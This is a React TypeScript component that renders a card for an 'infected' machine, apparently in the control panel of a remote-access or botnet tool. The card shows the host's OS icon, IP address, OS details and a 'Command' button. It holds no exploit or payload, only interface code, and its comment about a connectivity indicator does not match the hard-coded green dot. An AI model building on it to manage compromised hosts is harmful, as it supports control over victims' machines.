import React from "react"
import type {Infected} from "../types/infected.ts";

type Props = {
    infected: Infected,
    command: () => void
}
import { IoLogoWindows } from "react-icons/io5";
import { FaLinux } from "react-icons/fa6";
export const InfectedCard: React.FC<Props> = (props) => {

    /**
     * The indicator will change his color, due to the connectivity
     */
    return (
        <>
            <div className="card bg-base-100 w-60 shadow-sm">
                <div className="card-body">
                    {props.infected?.osType === "Windows" && <IoLogoWindows className={"w-40 h-40"}/>}
                    {props.infected?.osType === "Linux" && <FaLinux className={"w-40 h-40"}/>}
                    <div className={"flex items-center gap-5"}>
                        <h2 className="card-title text-lg">{props.infected.currentIpAddress}</h2>
                        <span className={"w-3 h-3 rounded-full bg-green-500"}></span>
                    </div>
                    <p>{props.infected?.osType} {props.infected?.osSubType}</p>
                    <div className="card-actions justify-start">
                        <button className="btn btn-primary" onClick={props.command}>Command</button>
                    </div>
                </div>
            </div>
        </>
    )
}